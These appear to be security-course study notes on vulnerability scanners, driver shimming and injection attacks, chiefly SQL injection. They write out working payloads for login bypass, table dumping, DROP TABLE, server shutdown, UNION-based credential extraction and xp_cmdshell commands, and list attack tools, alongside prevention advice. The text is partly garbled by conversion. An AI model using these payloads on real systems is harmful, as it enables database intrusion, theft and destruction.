- The industry standard as far as vulnerability scanning goes has got to be Tenable’s Nessus (tenable.com). Tenable has different product options to accomplish different things (Nessus Professional can be loaded on laptop for scanning, whereas Security Center is an enterprise-level version)
- The industry’s most widely deployed vulnerability scanner.
- Nessus Professional features high-speed asset discovery, configuration auditing, target profiling, malware detection, sensitive data discovery, and vulnerability analysis.
- More than 450 templates are available for compliance (e.g., FFIEC, HIPAA, NERC, PCI, more) and configuration (e.g., CERT, CIS, COBIT/ITIL, DISA STIGs) auditing.
- Nessus supports:
  - non-credentialed, remote scans;
  - credentialed, local scans for deeper, granular analysis of assets;
  - and offline auditing on a network device’s configuration. Nessus isn’t just a plain vulnerability scanner, it scans for viruses,
   ▪


## malware, backdoors, hosts communicating with botnet-infected systems, known/unknown processes as well as web services linking to malicious content.
 Network Utilities
Network utility programs perform functions useful to network engineers and security engineers
supporting penetration testing or identifying security flaws.
checking for unidentified items that have appeared in log files.
 ▪


##  Metasploit framework
  - primarily Perl-based, open source program
  - supports penetration testing of a variety of operating systems.
  - Versions exist for both the Unix and Windows environments.
Whisker/libwhisker.
  - Whisker scanner:
  - CGI vulnerability scanner module
  - been supplanted by Nikto.
  - libwhisker
  - Both Whisker and Nikto use libwhisker, an effective HTTP server security scanner.
  - a Perl based library module, is not a direct application.
  - Using the Perl library, custom HTTP packets can be developed using the whisker anonymous hash data structure, which is similar to an associated array.
  - This hash function can be used to generate HTTP requests and acquire HTTP responses from websites.
 ▪


## N-Stealth HTTP Vulnerability Scanner
  - a vulnerability assessment utility
  - scanning web servers for security vulnerabilities
as well as auditing functions.
  - It uses a large data base of vulnerabilities to identify web sever security flaws and delivers scan results in the form of an HTML document.
Shadow Security scanner:
  - conducts vulnerability scans on the Internet, extranets, and intranets and offers remediation strategies.
  - comprises variety of system-specific vulnerability modules: for CGI, NetBIOS, HTTP, FTP, UDP, MySQL..
Injection
Many types of injection attacks can occur.
One successful web application attack, injecting malicious commands into the input string.
- The objective: to pass exploit code to the server through poorly designed input validation in the application.
- This can occur using a variety of different methods
 ▪


##  file injection: injects a pointer in the web form input to an exploit hosted on a remote site
command injection: injects commands into the form fields instead of the expected test entry
shell injection: gain shell access using Java or other functions
Header manipulation
- Insertion of malicious data, which has not been validated, into a HTTP response header.
- Example
  - HTTP response splitting attack: exploits applications that allow a carriage return or line feed as input.
Driver Manipulation熟练控制[操作]
Drivers:
- Operating systems use drivers to interact with hardware devices or software
components.
- Example:
- print a page using Microsoft Word,
  - Word accesses the appropriate print driver via the Windows operating
system.
- access encrypted data on your system,
  - the operating system typically accesses a software driver to decrypt the data 1,794
     - intercepted HTTP traffic and inserted an ASCII line that sets the ▪


## so that you can view it.
Drivers manipulation
- causes the driver(s) to be bypassed altogether or to do what it was programmed to do—just not with the values that it should be receiving.
- change the data with which the driver is working.
Occasionally, an application needs to support an older driver.
- Example:
- Windows 10 needed to be compatible with drivers used in Windows 8, but all the
drivers weren’t compatible at first.
- Shimming provides the solution that makes it appear that the older drivers are
compatible.
A driver shim is additional code that can be run instead of the original driver. when a driver is no longer compatible. They Developers can:
Shimming
Shim: (填隙用木片;夹铁)
  - a small library
  - write a shim to provide compatibility
  - When an app attempts to call an older driver,
  - the operating system intercepts the call and redirects it to run the shim code
instead.
  - created to intercept API calls transparently and do one of three things:
  - handle the operation itself,
  - change the arguments passed,
  - or redirect the request elsewhere.
 ▪


##  Often, shims are written to support old APIs
Conversely, shims can be written to support a new API in an older environment (less common), give them functionality that weren’t originally written to have (which they weren’t developed, like run on OS versions).
In terms of malware:
Shimming: involves creating or modifying a library, to bypass a driver and
perform a function other than the one for which the API was created.
Refactoring
a set of techniques
to identify the flow and then modify the internal structure of code without
changing the code’s visible behavior.
- Refactoring code is the process of rewriting the internal processing of the code, without changing its external behavior.
- completely rewrite the driver to refactor the relevant code.
  - If the code is clunky, better rewrite the driver.
  - Usually for correct problems of software design. In the non-malware world:
  - done in order to improve the design, to remove unnecessary steps, and to create better code.
In the malware world:
  - done to look for opportunities to take advantage of weak code and look
for holes that can be exploited.
       ▪


## Attackers with strong programming skills can use their knowledge to manipulate drivers by either creating shims, or by rewriting the internal code.
- If the attackers can fool the operating system into using a manipulated driver, they can cause it to run malicious code contained within the manipulated driver.
SQL Injection
cross-site scripting is not the only place where URL encoding is used.
- Anywhere you want to obscure text, you can URL-encode it.
- makes it harder for users to understand, can't convert the hexadecimal to ASCII.
- attacks can be obscured or made successful through URL encoding
  - SQL injection is one of them. SQL (Structured Query Language):
the defacto language used for communicating with online / relational databases.
used to make programmatic requests of a relational 1,797

▪
database server.
  - The server manages the storage, vary from one server
type to another,
  - but in order to get to the storage, inserting data or
retrievingit, use SQL
SQL injection / insertion attack:
an attack against the database server,
- This attack focuses on the database application of a web server, acquire sensitive info in the database or to execute remote code.
manipulates the database code to take advantage of a weakness in it.
  - Sends / injects unexpected data through a web request.
  - Sometimes, form data is passed directly into an SQL query from the application server to the database server to execute.
  - the database could be altered or damaged.
  - data could be extracted
  - have authentication bypassed.
The name refers to Microsoft’s SQL database, but it is
 ▪


## also applicable to other databases slike Oracle Net Listener, MySQL.
One version of the attack occurs when the user input stream contains a string literal escape characters
and these characters are not properly screened. Example:
the ' character in the username field. This input
can modify the results of SQL statements conducted on the database and result in manipulation of the database contents and the Web server.
One reason for this is that error messages
displayed by the SQL server from incorrect inputs such as the ' character in the username can provide valuable information, such as password hashes, usernames, and the database name, to an attacker.
Applications you are trying to attack with SQL injection must already have SQL in place
- to run a query necessary for the application to succeed. Example:
- search on the site for "jodie whitta ker doll”, get the right results back.
  - Behind the scenes, the application may have an SQL 1,799

▪
statement that reads
  - SELECT*FROMinventory_tableWHERE description == ' $searchstr' ;
need to find a way to get your query to work in the context of the existing one.
  - Damn Vulnerable Web App
  - a deliberately vulnerable web application
  - used to learn, try against different levels of security in the application.
  - The string entered: ' or 'a' = ' a. User ID: ‘ ' or 'a' = ' a’
  - uses the single quote to close out the existing query string and then introduces the Boolean logicterm or along with a test that will return a true.
  - This means the overall expression will return true.
  - Every row in the dat abase will evaluate to true. Since the query here likely starts with SELECT *, we get every row in the database back.
the query inserted leaves the last quote out, the query in the application already has a single quote at the end.
- may not always work, depending on the SQL query in 1,800

▪
place in the app
- In some cases, you may need to replace the rest of the query in the application. This can be done using comment characters.
- SQL server based on MySQL, MariaDB: use the double dash - - to indicate a comment.
  - Everything after your double dash is commented out.
  - allow you to inject your own complete SQL statement and then just comment out everything else in the application.
  - MySQL syntax also allows the use of the # character to indicate a comment. It functions just like the double dash.
- In Oracle / Microsoft SQL Server, the double dash also works.
  - semicolon (;) to indicate the end of the SQL line,
  - two dashes (--) as an ignored comment.
Various types of exploits use SQL injection, common categories:
  - Escape characters not filtered correctly
  - Type handling not properly done
  - Conditional errors
 ▪


##   - Time delays
SQL doesn't always work the same, to determine the underlying
database server.
- based on the reconnaissance did earlier.
  - example, a poorly configured Apache server may tell you what modules are loaded.
- based on the results of an application version scan that there is a MySQL server.If you are doing against a Microsoft IIS installation, you could guess it may be Microsoft SQL Server.
- introduce invalid SQL into the application.
  - If the application is well programmed, you should n't get anything back, but often you will get an error from the database server.
  - get an error message that includes the database server or error message that allows to determine the server type because of the wording of the error.
 ▪


## executed when someone clicks a logon button.
  - SQL statements take the username and password entered, and query the database to see if they are correct.
Problem begins with the way websites are written.
  - written in some scripting, markup, or programming language, like HTML (Hypertext Markup Language), PHP (PHP: Hypertext Preprocessor), ASP (Active Server Pages)...
  - These languages don’t understand SQL,
  - the SQL statements are usually put into a string.
example:
"SELECT * FROM tblUSERS WHERE UserName ='" +
txtUserName + "'"AND Password = '"+password +"'"
  - Notice that single quotes are inserted into the text so that whatever the user types into username and password text fields is enclosed in quotes within the SQL query string, like this:
  - SELECT * FROM tblUSERS WHERE UserName ='admin' AND Password = 'password'';
  - attacker will put a SQL statement in the fields that is 1,803

always true, like:
  - ' or '1' ='1
  - This results in SQL query: Since 1 always equals 1,
the user is logged in.
  - ‘SELECT * FROM tblUSERS WHERE UserName =''
or '1' ='1' AND Password = '' or '1' ='1'' example:
- Query sent by amazon wen app:
  - Input: Darril Gibson
  - SELECT * FROM Books WHERE Author=‘Darril Gibson’;
  - *: Wildcard that returens all columns in a table.
  - Acctack input:
  - Darril Gibson’; SELECT * FROM Customers;- -
  - If database accept directly:
  - SELECT * FROM Books WHERE Author=‘Darril Gibson’; SELECT * FROM Customers; --’
The first line: retrieves data from the database, just as before. But, the semicolon signals the end of the line and the database will accept another command.
The next line: reads all the data in the Customers table: names, 1,804

▪
credit card data, and more.
The last line: comments out the second single quote to prevent a SQL error.
If the application doesn’t include error-handling routines, these errors provide details about the type of database the application is using, such as an Oracle, Microsoft SQL Server, or MySQL database.
Different databases format SQL statements slightly differently, but once the attacker learns the database brand, it’s a simple matter to format the SQL statements required by that brand. The attacker then follows with SQL statements to access the database and may allow the attacker to read, modify, delete, and/or corrupt data.
SQL Injection Vulnerabilities
Databases supporting web servers and applications are attractive targets for hackers. The information contained in these databases can be sensitive and critical to an organization.
The most popular database systems are Microsoft
SQL, MySQL, and Oracle Net Listener, and they operate on ports 1433, 3306, and 159, respectively.
A popular and effective attack against database applications on web servers: SQL injection.
 ▪


##  This type of attack takes advantage of SQL server
vulnerabilities, such as lack of proper input string checking and failure to install critical patches in a timely fashion.
SQL Injection Testing and Attacks
An SQL injection attack exploits vulnerabilities in a web server database
These vulnerabilities arise because:
  - the database does not filter escape characters
  - the database does not use strong typing, which prohibits input statements from being interpreted as instructions.
allow the attacker to gain access to the database
read, modify, or delete information.
.even possible to gain system privileges for the computer itself with some SQL injection exploits.
Example:
  - uses database server procedures susceptible to SQL injection.
  - One type of attack is database footprinting
  - identifies the database tables and forms the basis for
      Microsoft SQL Server: ▪


## other attacks.
Preparing for an Attack
To conduct an SQL injection, a hacker initially test a database to determine if it is susceptible to such an attack.
place a single quote character, ', into the query string of a URL.
  - Desired response: an Open DataBase Connectivity (ODBC) error message that indicates a vulnerability to an SQL injection attack.
  - ODBC is a standard database access process that provides the ability to access data from any application, independent of the database management system (DBMS) being used.
  - This “universality” is made possible by a database driver layer that translates the database data queries into commands that are recognized by the particular DBMS involved.
  - A typical ODBC error message is:
  - Microsoft OLE DB Provider for ODBC Drivers error
'80040el4'
  - [Microsoft] [ODBC SQL Server Driver] [SQL Server]Incorrect syntax near the keyword 'and' .
  - /wasc.asp, line 68
  - In general, the return of an error message indicates that injection will work. It is important to search the returned page for words such as ODBC or syntax.
 ▪


##  If the website is supported by a backend database that
incorporates scripting languages, like CGI or asp and dynamic data entry, the site is likely to be amenable to SQL injection exploits.
  - Therefore, testing for vulnerabilities is enhanced if Web pages at a URL request input: logins, passwords, or search boxes.
  - Also, the HTML source code might contain FORM tags that support sending using a POST command to pass parameters to other asp pages.
  - The code between the FORM tags is susceptible to SQL injection testing, such as entering the ' character.
  - A sample of such HTML source code is:
  - <FORM action=Search/search.asp method=post>
  - <input: type=hidden name=C value=D>
  - </FORM>
Use a direct injection: using an SQL statement and adding a space and the word OR to the parameter value in the
query.
  - If an error message is generated, the database is vulnerable to an SQL injection attack.
quoted injection test:
  - where a parameter in the argument of an SQL
statement is modified by prefixing and appending it with quotes. Another testing option, use automated vulnerability
   ▪


## scanning tools:
  - WebInspect and Acunetix. These tools will be
addressed later in this chapter.
Conducting an Attack Q: ___ input: A
Statement: “ A “ ;
  - " SELECT PartCost, PartName FROM PartsList
  - WHERE PartName LIKE ‘ % “ & strPartNameInclude & " %' " ;
A simple example of an SQL injection attack
use the single quotation mark or identity such as 1:1 as part of an input value to a Web page.
  - These values can be inserted into a login as follows:
  - -Login: ron'
  - -Login: 1:1 - -
 ▪


##  SQL Server ignores everything after a - -
  - because they are single line comment sequence in
Transact-SQL.
  - needed for inputs and queries to terminate without an error.
The ; character: denotes the end of an SQL query statement
used with a URL:
  - -http: //page/index.asp?id=ron'
  - -http: //page/index.asp?id=1=1- -
  - One desired outcome of using a URL: to access an asp page that will link our query to another page in the database.
  - Example:
  - the following URL contains a variable category of
employee with the value fulltime.
  - http: //page/index.asp?employee= fulltime'
  - Note: character ' was added to the value fulltime.
  - If the injection works as desired:
  - URL translates into the SQL command:
  - SELECT * FROM hrdata
  - WHERE Employee=' fulltime' ;
  - This command initiate a query: return not only the full-
   ▪


## time employee data but all the other data from the hrdata table in the database.
enter escape characters into parameters of an SQL statement, then access database information.
  - Example:
  - query a list of users for a specific entered user name.
  - Statement:= " SELECT Username FROM Users
  - WHERE Username = ‘ “ + Username + ” ’ ; ”
By manipulating the username variable, an SQL injection can be initiated to do more than verify a user’s name.
  - Example
  - giving the username variable a value of h' or 'y' = 'y
results in the following SQL statement:
  - SELECT Username FROM Users
  - WHERE Username = ' h'or 'y'='y '
  - When the Username argument is evaluated:
  - ‘Y’ = 'y' will assess to TRUE
  - and an authentic username will be returned.
A variation on this ' or username is not null or username= ' :
  - This statement will be executed as follows and provide the entries for all users.
       ▪


##   - SELECT Username FROM Users
  - WHERE Username= ‘ ’ or Username is not null or
Username= ‘ ’;
SQL server provides another command that can be
used in SQL injection:
  - shutdown with nowait
  - This command will terminate the server operation and
implement an attack with the following responses:
  - Username: ; shutdown with nowait; - -
  - Password: [Leave blank]
  - If the SQL server is vulnerable, the following statement will be executed:
  - SELECT Username FROM Users
  - Where username= ‘ ; shutdown with nowait; - - ’ and
  - user_Pass=' '
Lack of Strong Typing
Another form of SQL injection takes advantage of the SQL developer not having incorporated strong typing into program.
when program is expecting a variable of one type or different
   ▪


## type is entered, an SQL injection attack can be effected.
Example: the variable Employeenum is expected to be a number. SELECT Employeename FROM Emptable
WHERE Employeenum = ‘ “ + Employeenum + ” ’; If a character string is inserted instead, the database could be
manipulated.
Setting the Employeenum variable equal to the string
  - l; DROP TABLE Emptable yields
  - SELECT Employeename FROM Emptable
  - WHERE Employeenum = l;DROP TABLE Emptable;
This SQL statement will erase the table Emptable from the database.
      Union Select Statements
An attack variation: provide database records other than those ▪


## specified in a valid SQL statement
Modify an SQL WHERE clause with a UNION SELECT statement.
This approach will return data from multiple tables in the database with one query.
Example:
  - SELECT Broker FROM BrokerList
  - WHERE 1 = 1 UNION ALL SELECT Broker FROM
BanksList WHERE 1 = 1;
This UNION statement will provide the broker names in list of brokers in the first query and the records from the table containing the name of banks providing brokerage services from the UNION statement.
The use of a LIKE clause, another method of SQL injection Example:
inserting wildcard characters (like %),
  - Then, the WHERE clause = TRUE when the argument
strPartNameInclude is included as part of a part name:
  - Then, all parts names include the string PartName will
be returned.
  - " SELECT PartCost, PartName FROM PartsList
  - WHERE PartName LIKE ‘ % “ & strPartNameInclude &
     ▪


## " %' " ;
employ the wildcard symbol to guess the admin
username:
  - querying with ad%.
Another example incorporating the UNION and LIKE statements is to
Example:
the page http: / /page/ index.asp?id=20.
use the UNION statement to set up a query as follows:   - http: / /page/index.asp?id=20 UNION SELECT TOP 1
TABLE_NAME FROM INFORMATION_SCHEMA.TABLES - -
  - Information_Schema Tables: hold data on all the tables
in the server database
  - Table Name field: holds name of each table in the database.
  - This string attempts to UNION the integer 20 with another string from the database.
  - When the statement is processed:
  - SELECT: provide the name of the first table in the
database
  - UNION: result in the SQL server attempting to convert
  use the ODBC error message to gather information from the
database.
   ▪


## a character string to integer.
  - This conversion will fail, error message will be return:
  - Microsoft OLE DB Provider for ODBC Drivers error '80040e07‘
  - [Microsoft] [ODBC SQL Server Driver] [SQL Server]Syntax error converting the nvarchar value 'employeetable' to a column of data type int.
  - /index.asp, line 6
  - the error message provides the information:
Then, by using the following statement,
  - http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME not IN ('employeetable') - -
If you use the LIKE keyword in the following statement, additional information can be found:
  - http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE ' % 25 login % 25 ’ --
  - The term '%25login%25’: will be interpreted as %login% by the server.
   - the string could not be converted to an integer
  - provides the name of the first table in the database, namely employeetable.
  the next table in the database tables will be returned:
   1,816 ▪


##   - The resulting ODBC error message would be as follows:
  - Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
  - [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'sys_login' to a column of data type int.
  - /index.asp, line 6
  - The ODBC error message
The next step, obtain a login name from the sys_login table:
  - http://page/index.asp?id=20 UNION SELECT TOP 1 login_name FROM sys_login - -
  - The resulting ODBC error message:
  - Microsoft OLE DB Provider for ODBC Drivers error
'80040e07'
  - [Microsoft][ODBC SQL Server Driver][SQL ServerJSyntax error converting the nvarchar value 'whiteknight’ to a column of data type int.
  - /index.asp, line 6 ⁃
 sys_login.
  table:
provides the login name whiteknight from the sys_login
1,817 ▪


##  To obtain the password for whiteknight:
  - http://page/index.asp?id=20 UNION SELECT TOP 1
password FROM sys_login where login_name='whiteknight' - -
  - The corresponding ODBC error message is:
  - Microsoft OLE DB Provider for ODBC Drivers error ‘80040907'
  - [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'rlkfooB' to a column of data type int.
  - /index.asp, line 6
  - Thus, the password for whiteknight is revealed: rlkfoo3.
Acquiring Table Column Names
Once table identified, obtaining the column names provides valuable information concerning the table and its contents.
Examples:
acquire column names by accessing the database
table, INFORMATION_SCHEMA.COLUMNS.
The injection attack begins with the URL:
  - http://page/index.asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
   ▪


## WHERE TABLE_NAME= ' parts ' - -
  - This statement yields the following ODBC output,
which gives the first column name in Parts table as partnum:   - Microsoft OLE DB Provider for ODBC Drivers error
'80040e07‘
  - [Microsoft] [ODBC SQL Server Driver] [SQL ServerJSyntax error converting the nvarchar value 'partnum' to a column of data type int.
  - /index.asp, line 6
To obtain, the second column name, the expression
not IN () can be applied as shown:
  - http: / /page/index. asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'parts' WHERE COLUMN_NAME not IN ('partnum' ) --
  - This query now gives the following ODBC error message:
  - Microsoft OLE DB Provider for ODBC Drivers error '80040907‘
  - [Microsoft] [ODBC SQL Server Driver] [SQL ServerJSyntax error converting the nvarchar value 'partcost‘ to a column of data type int.
  - /index.asp, line 6
  - The error message provides the next column name as partcost.
   ▪


##   can be found.
In this manner, all the remaining columns in the table
Stored Procedures
Stored procedure: group of SQL statements that is designed to
perform a specific task.
This approach is an alternative to having the application layer construct SQL statements dynamically.
A stored procedure can be called by its name and pass the required parameters to the procedure.
SQL injection can also use stored procedures in a web server database.
SQL injection can be initiated if the stored procedure is not employed properly.
One useful procedure: master.dbo.xp_cmdshe11, incorporates follow syntax:
xp_cmdshell ( 'Command_string’ ) [, no_output]
The argument ' command_string' is an SQL command.
Example:
following construction provides employee info from an employee name search:
     ▪


##   - CREATE PROCEDURE SP_EmployeeSearch @Employeename varchar(200) = NULL AS
  - DECLARE @sql nvarchar(2000)
  - SELECT @sql = ' SELECT EmloyeeNum,
EmployeeName, Title, Salary ' + ' FROM Employee Where '
  - IF @EmployeeName IS not NULL
  - SELECT @sql = @sql + ' EmployeeName LIKE ' ' ' + @employeename + ' ' ' '
  - EXEC (@sql)
  - In this procedure, the user provides the @employeename variable as input, which is then concatenated 连 接的 with @sql.
An SQL injection can be initiated by the user if he or she substitutes 1' or ‘1’=‘1’ ;exec master.dbo.xp_cmdshell 'dir' -
- for the @employeename variable.
  - If this substitution is made, the SQL statement
executed will be as follows:
  - SELECT EmployeeNum,
EmployerNumber, ,EmployeeName FROM Employee Where EmployeeName LIKE ‘1’ or ‘1’=‘1’;exec master.dbo.xp_cmdshell 'dir' - -
  - The result of this SQL query: access to all rows from the employee table.
Another effective stored procedure in SQL injections: master.dbo.sp_makewebtask:
 ▪


##  produces an SQL statement and an output file location. The syntax for master.dbo.sp_makewebtask is:
  - sp_makewebtask [@outputfile =] 'outputfile', [@query =] 'query'
Extended Stored Procedures
Extended stored procedures: extend the functions available in the SQL Server environment and are useful in setting up and maintaining the database.
Because of vulnerabilities in some of these procedures, these programs can be called to initiate and support SQL injection attacks.
A listing of some of these extended procedures is given as follows:
xp_availablemedia. Provides a list of available computer drives
xp_dirtree. Provides a directory tree
xp_enumdsn. Identifies server ODBC data sources
xp_loginconfig. Provides server security mode data
xp_mkecab. Supports user generation of a compressed archive of files on the server and files that can be
         ▪


## accessed by the server
exec master..xp_cmdshell 'dir ' . Provides a listing of
the SQL Server process current working directory
exec master..xp_cmdshell 'net1 user ‘: Provides a list
of all computer users
Custom extended stored procedures. Can also be developed to execute as part of the SQL server code
Sewer System Tables
It is helpful to know which system tables in the database server can be used as targets in SQL injection.
Summarizes the tables for 3 common database servers: Sewer Database Tables
     ORACLE SQL
SYS.USER_CATALOG syscolumns
SYS.USER_CONSTRAINTS
MS ACCESS MS
MSysACEs MsysQueries ▪


## sysobjects
SYS.USER_OBJECTS SYS.TAB MsysObjects SYS.USER_TAB_COLUMNS MSysRelationships SYS.USER_TABLES
SYS.USER_TRIGGERS
SYS.USER_VIEWS SYS.ALL_TABLES
SQL Injection Prevention and Remediation
SQL injection: attack a web server database, compromise critical information, and expose the server and the database to a variety of malicious exploits;
Measures to mitigate SQL injection attacks.
does not guarantee that SQL injection can be completely eliminated,
but make it more difficult for hackers to conduct these attacks.
The protective actions are summarized as follows:
  - Allow only known good input.
  - Append and prefix quotes to all client inputs.
  - Check for accounts with weak / old passwords
  - Check to make sure numeric inputs are integers before
 passing them to SQL queries.
  - Eliminate unnecessary accounts.
  - Employ needed stored procedures with embedded parameters through safe callable interfaces.
  - Ensure that patches on the server are up to date and properly installed.
  - Limit the use of dynamic SQL queries, if possible.
  - Limit user inputs to one query, preventing multi-
statement attacks.
  - Monitor logging procedures.
  - Practice the principle of least privilege regarding access to the database.
  - Remove stored procedures that are not needed.
  - Candidates include:
  - xp_sendmail
  - sp_makewebtask
  - master..xp_cmdshell
  - xp_startrnail
  - Run database applications from a low-privilege account.
  - Sanitize client-supplied input by filtering data according to least privilege, beginning with numbers and letters. If it is necessary to include symbols, they should be converted to HTML substitutes. ▪


## eliminate single and double quotes, semicolons, back slashes, slashes, and similar characters.
  - Set appropriate privileges for stored procedures.
  - Set security privileges on the database to the least
needed.
  - Use bound parameters to create an SQL statement with placeholders such as ? for each parameter, compile the statements, and execute the compilation later with actual parameters.
Automated SQL Injection Tools
A series of automated tools for finding SQL injection vulnerabilities and SQL injection attacks.
A summary of a number of the popular SQL injection tools
Absinthe.
an automated tool
to implement SQL injections and retrieve data from a web server database.
The Absinthe screen interface supports entering target
data, such as the URL, Web application injectable parameters, cookies, delays, speedups, and injection options.
   ▪


##   Automagic SQL.
an automated injection tool
against Microsoft SQL server that supports applying
xp_cmdshell, uploading database files, and identifying and 1,827

▪
browsing tables in the database.
Osql.
replaced by sqlcmd, it is good to be aware of it.
Osql interacts with a web server using ODBC and supports entering script files, Transact-SQL statements, and
system procedures to the server database.
sqlcmd
script files, and system procedures in SQLCMD mode. It replaces Osql utility functions.
SQLDict.
application developed on Visual FoxPro 8.0 and
supports the access of a variety of relational databases. It provides a common interface to execute SQL
commands, implement and test for dictionary attacks, browse and list database tables, display table attributes, and export table attributes.
  This utility supports entering Transact-SQL statement,
   ▪


## SQLExec
servers to display database tables and fields and generate SQL commands for different functions.
An SQLEXEC ( ) function in Visual FoxPro sends and executes an SQL command to a data source.
SQLbf:
An SQL server brute force / dictionary password
cracker
can be used to decrypt a password file or guess a password.
can also be used to evaluate the strength of Microsoft SQL Server passwords offline.
SQLSmack.
A Linux-based tool
it can execute remote commands on Microsoft SQL server.
The commands are executed through the master.Xp_cmdshell but require a valid username and password.
 This database utility can be used with a variety of
         ▪


## SSRS.
Microsoft SQL Server Resolution Service is susceptible
to buffer overflow attacks which can lead to the server executing arbitrary code, elevating privileges, and compromising the web server and database.
SQL2.exe.
This UDP buffer overflow remote hacking tool
sends a crafted packet to UDP port 1434 on the SQL Server 2000 Resolution Service.
The buffer overflow can result in the execution of
malicious code in the server using the xp_cmdshell stored procedure.
for vulnerabilities: SQLBlock.
This utility functions as an ODBC data source and inspects SQL statements to protect access to Web server
         ▪


## databases.
block dangerous and potentially harmful SQL statements and alert the system administrator.
Acunetix Web Vulnerability Scanner (WVS). automated scanner
can work in conjunction with manual utilities to analyze Web applications for vulnerabilities
can be used for penetration testing.
WSDigger
an open source black box penetration testing Web services framework
can test for cross site scripting, SQL injection and other types of attack vulnerabilities.
WebInspect
automated tool
can be used to identify Web application vulnerabilities by dynamically scanning these applications.
         ▪


##  As part of WebInspect’s vulnerability analysis, this utility will check for and report SQL injection vulnerabilities.
Blind SQL injection attacks
- injection attack on a web server based on
responses to True/False questions.
- Not all queries will generate output.
- This means you are flying blind because you can't see the results of your query.
  - not display errors with information about the injection results to the attacker.
- Because you may be flying blind, you need to change your approach.
  - structure your query so you get either success or failure that you can see because of how the application works.
  - The purpose of a blind injection: see if the page behaves differently based on the input provided.
  - This may allow you to determine whether a page is vulnerable to SQL injection before you spend a lot of time trying to run these attacks. - ▪


##   - try to get a false by appending "and 1=2". Since 1 never equals 2, the entire search should return false.
  - see the results from that page
  - run another query that should generate a true. l=l.
  - If you get a different result from the query 1=1 than you did from 1=2, the page may be vulnerable to SQL injection.
  - make this assumption because the response from the app was different when different SQL was submitted.
Countermeasures
provide customized database server error
messages that do not provide the attacker with useful data.
Apply least privilege to a user by not connecting the user to the database with the privileges of an owner of
the database or of a superuser.
Defend attack:
    - Input validation / filter input. Server side validation.
  - remove bad elements.
  - May use white listing, list of text allowed.
- Proper error handling
  - Instead of showing the errors to the user, many web sites simply present a generic error web page that doesn’t provide any details.
  - prevents the attacker from gaining information from these errors, though.
- Stored procedures / parameterized queries
  - These have similar effects because you can't manipulate the string in the program. Values sent from the user side become parameters passed into the queries. Because of that, comment characters won't eliminate the rest of the query string . Additionally, anything that tries to insert SQL statements by manipulating the quoting won't work because the behavior as a parameter is different from just inserting text into a string value.
  - SQL statements written and stored on the database, can be called by applications.
  - a group of SQL statements that execute as a whole,like a mini-program. dynamic web pages.
  - parameterized stored procedure accepts input data as
parameter.
  - Not copying the input directly into statement,
  - the input is passed to the stored procedure as a parameter.
  - The stored procedure performs data validation, it handles the parameter (the inputted data) differently and prevents a SQL injection attack.
  - Example:
  - searching for a book by an author where an attacker
entered the following text:
  - Darril Gibson’; SELECT * From Customers;--
  - The web app passes this search string to a stored
procedure.
  - The stored procedure uses the entire search string
in a SELECT statement like this:
  - SELECT * From Books Where Author = “ Darril
Gibson’; SELECT * From Customers;-- ”
  - interpreted as harmless text rather than
malicious SQL statements.
  - It will look for books with name using all of this text: Darril Gibson’; SELECT * From ▪


## Customers;--.
  - Books don’t have names with SELECT statements embedded in them, so the query comes back empty.
  - Not Code signing: it is for code injection.
Depending on how well the database server is locked down (or not), SQL injection attacks may allow the attacker to access the structure of the database, all the data, and even modify data. In some cases, attackers have modified the price of products from several hundred dollars to just a few dollars, purchased several of them, and then returned the price to normal.
LDAP Injection
SQL injection: exploit weaknesses in statements input by users.
LDAP injection: exploits weaknesses in LDAP (Lightweight Directory Access
Protocol) implementations.
occur when the user’s input is not properly filtered
  - the result can be executed commands, modified content, unauthorized queries.
  - One of the most common uses of LDAP is associated with user information.
   ▪


##   - Numerous applications exist,
  - users find other users by typing in a portion of their name.
  - queries looking at the cn value or other fields (for department, home directory...)
  - feed unexpected values, finding employee information equates to finding usernames and values relates to passwords.
Best way to prevent; filter input, use a validation scheme to make certain that queries do not contain exploits.
LDAP injection is an attack that exploits applications that construct LDAP statements based on user input. it exploits nonvalidated web input that passes LDAP queries.
- if a web application takes whatever is entered into the form field and passes it directly as an LDAP query, an attacker can inject code to do all sorts of stuff. You’d think this kind of thing could never happen, but you’d be surprised just how lazy a lot of code guys are.
- Example
- a web application allows managers to pull information about their projects and employees by logging in, setting permissions, and providing answers to queries based on those permissions.
- Manager Matt logs in every morning to check on his folks by entering his username and password into two boxes on a form, and his login is parsed into an LDAP query (to validate who he is). The LDAP query would look something like
- which basically says, “Check to see whether the username Matt matches the password MyPwd! If it’s valid, login is successful and off he goes.”
 ▪


## In an LDAP injection attack, the attacker changes what’s entered into the form field by adding the characters )(&) after the username and then providing any password.
Because the & symbol ends the query, only the first part—“check to see whether Matt is a valid user”—is processed and, therefore, any password will work.
- The LDAP query looks like this in the attack:
   - This basically says, “Check to see whether you have a user named Matt. If he’s there, cool—let’s just let him do whatever he wants.”
- While there’s a lot of other things you can do with this, I think the point is made; don’t discount something even this simple because you never know what you’ll be able to find with it.
SOAP injection
- Simple Object Access Protocol (SOAP) is designed to exchange structured information in web services in computer networks and uses XML to format information.
- You can inject malicious query strings (much like SQL injection, as a matter of fact) that may allow you to bypass authentication and access databases behind the scenes.
- SOAP is compatible with HTTP and SMTP, and messages are typically “one way” in nature.
XML Injection
- SQL injection attack: web users with weakness with SQL, entering values that they should not.
- XML injection attack: users enter values that query XML (known as XPath) with values that take advantage of exploits
  - XPath works in a similar manner to SQL
  - does not have the same levels of access control, but taking advantage of
weaknesses and return entire documents.
- XML 指可扩展标记语言(extensible markup language), XML 被设计用 来传输和存储数据。 - Best way to prevent: filter input, sanitize it to make certain that it does not cause XPath to return more data than it should.
Directory Traversal / Command Injection
directory traversal attack:
gain access to restricted directories (like root directory) through HTTP.
is a specific type of command injection attack
attempts to access a file by including the full directory path, or traversing the directory structure.
  - gain access to the root directory of a system (limited by administrative users), essentially gain access to everything on the system.
  - the root directory of a website is far from the true root directory of the server;
  - an absolute path to the site’s root directory is something in IIS (Internet Information Services), like C:\ inetpub\wwwroot.
